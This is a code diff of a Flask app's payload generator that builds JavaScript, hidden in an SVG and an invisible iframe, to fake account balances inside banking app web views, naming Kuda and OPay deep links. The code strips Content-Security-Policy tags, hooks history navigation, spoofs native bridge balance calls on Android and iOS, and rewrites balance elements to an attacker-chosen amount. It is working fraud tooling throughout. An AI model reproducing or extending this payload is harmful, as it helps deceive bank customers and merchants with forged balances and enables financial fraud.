@@ -12,95 +12,100 @@ os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 CORS(app)
 
 def generate_robust_payload(device_id, target_app, target_amount):
-    # Multiple fallback techniques for webview targeting
-    js_payload = f"""
-    // WebView detection and hooks
-    function isInWebView() {{
-        return !!(window.navigator.userAgent.match(/Android/i) || 
-                  window.navigator.userAgent.match(/iPhone|iPad|iPod/i));
-    }}
-    
-    // Platform-specific hooks
-    function hookWebView() {{
-        if (!isInWebView()) return;
-        
-        // Override native methods
-        const originalPushState = history.pushState;
-        history.pushState = function() {{
-            originalPushState.apply(this, arguments);
-            setTimeout(() => {{
-                document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-                    el.textContent = '{target_amount}'
-                );
-            }}, 100);
-        }};
-    }}
-    
-    // CSP bypass
-    function bypassCSP() {{
-        try {{
-            const metaTags = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
-            metaTags.forEach(tag => tag.remove());
-        }} catch (e) {{}}
-    }}
-    
-    // Deep link trigger
-    function triggerDeepLink() {{
-        try {{
-            window.location = 'kuda://balance';
-            window.location = 'opay://dashboard?section=balance';
-            window.location = 'bank://account/balance';
-        }} catch (e) {{
-            setTimeout(() => {{
-                document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-                    el.textContent = '{target_amount}'
-                );
-            }}, 500);
+    # Device-specific payloads
+    android_payload = f"""
+    // Android-specific hooks
+    try {{
+        // WebView detection
+        if (navigator.userAgent.includes('Android')) {{
+            // Native bridge hooks
+            window.NativeBridge = window.NativeBridge || {};
+            window.NativeBridge.getAccountBalance = function() {{
+                return Promise.resolve({{balance: '{target_amount}'}});
+            }};
+            
+            // Override native methods
+            const originalPushState = history.pushState;
+            history.pushState = function() {{
+                originalPushState.apply(this, arguments);
+                setTimeout(() => {{
+                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
+                        el.textContent = '{target_amount}'
+                    );
+                }}, 100);
+            }};
         }}
-    }}
-    
-    // Primary override function
-    function overrideBalance() {{
-        const balanceSelectors = [
-            '[data-testid="balance"]',
-            '.account-balance',
-            '[id*="balance"]',
-            '[class*="amount"]'
-        ];
-        
-        balanceSelectors.forEach(selector => {{
-            const elements = document.querySelectorAll(selector);
-            elements.forEach(el => el.textContent = '{target_amount}');
-        }});
-        
-        // MutationObserver for dynamic content
-        const observer = new MutationObserver(mutations => {{
-            mutations.forEach(mutation => {{
-                mutation.addedNodes.forEach(node => {{
-                    if (node.nodeType === Node.ELEMENT_NODE) {{
-                        balanceSelectors.forEach(selector => {{
-                            const bal = node.querySelector(selector);
-                            if (bal) bal.textContent = '{target_amount}';
-                        }});
-                    }}
-                }});
-            }});
-        }});
-        
-        observer.observe(document.body, {{ childList: true, subtree: true }});
-    }}
-    
-    // Run everything
-    window.onload = () => {{
-        bypassCSP();
-        hookWebView();
-        triggerDeepLink();
-        overrideBalance();
-    }};
+    }} catch (e) {{}}
     """
     
+    ios_payload = f"""
+    // iOS-specific hooks
+    try {{
+        // WKWebView detection
+        if (navigator.userAgent.includes('iPhone|iPad|iPod')) {{
+            // Safari bridge hooks
+            if (window.webkit && window.webkit.messageHandlers) {{
+                window.webkit.messageHandlers.getAccountBalance = {{
+                    postMessage: function() {{
+                        return Promise.resolve({{balance: '{target_amount}'}});
+                    }}
+                }};
+            }}
+            
+            // Override native methods
+            const originalPushState = history.pushState;
+            history.pushState = function() {{
+                originalPushState.apply(this, arguments);
+                setTimeout(() => {{
+                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
+                        el.textContent = '{target_amount}'
+                    );
+                }}, 100);
+            }};
+        }}
+    }} catch (e) {{}}
+    """
+    
+    # Combined payload with platform detection
+    js_payload = f"""
+    // Platform detection
+    const isAndroid = navigator.userAgent.includes('Android');
+    const isIOS = navigator.userAgent.includes('iPhone|iPad|iPod');
+    
+    // Store target amount in localStorage
+    localStorage.setItem('targetBalance', '{target_amount}');
+    
+    // Hook into storage events
+    window.addEventListener('storage', function(e) {{
+        if (e.key === 'targetBalance') {{
+            document.querySelectorAll('[data-testid="balance"]').forEach(el => 
+                el.textContent = e.newValue
+            );
+        }}
+    }});
+    
+    // Execute platform-specific hooks
+    if (isAndroid) {{
+        {android_payload}
+    }} else if (isIOS) {{
+        {ios_payload}
+    }}
+    
+    // Try deep links first
+    try {{
+        window.location = 'kuda://balance';
+        window.location = 'opay://dashboard?section=balance';
+    }} catch (e) {{
+        // Fallback to direct DOM manipulation
+        document.querySelectorAll('[data-testid="balance"]').forEach(el => 
+            el.textContent = '{target_amount}'
+        );
+    }}
+    """
+    
+    # Create an invisible iframe to execute the payload
     return f"""<svg xmlns="http://www.w3.org/2000/svg">
-        <script>{js_payload}</script>
+        <iframe srcdoc='<script>{js_payload}</script>' style="display:none"></iframe>
     </svg>"""
 
 @app.route('/')
